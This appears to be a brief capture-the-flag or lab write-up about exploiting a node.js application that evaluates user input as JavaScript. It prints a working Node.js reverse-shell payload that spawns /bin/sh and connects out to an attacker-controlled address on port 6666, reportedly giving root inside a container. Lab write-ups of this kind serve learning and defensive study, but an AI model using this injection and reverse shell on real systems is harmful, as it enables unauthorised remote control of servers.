There is a cookie that remembers authentication called **connect.sid**:

**Inputing non numbers results in a crash**

After a bit of trial and error and considering this is working in node.js, i decided to try the following input:

```js
function nothing(){return 1;}; nothing()
```

And this actually succeeds in increasing the timer, so i can just do whatever i want. Let us try to call ourselves:


```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(6666, "10.10.59.183", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; 
})();
```

No idea why this worked i mean i know nothing of js

Somehow this jumps to root???? (turns out this is a [[container]] )
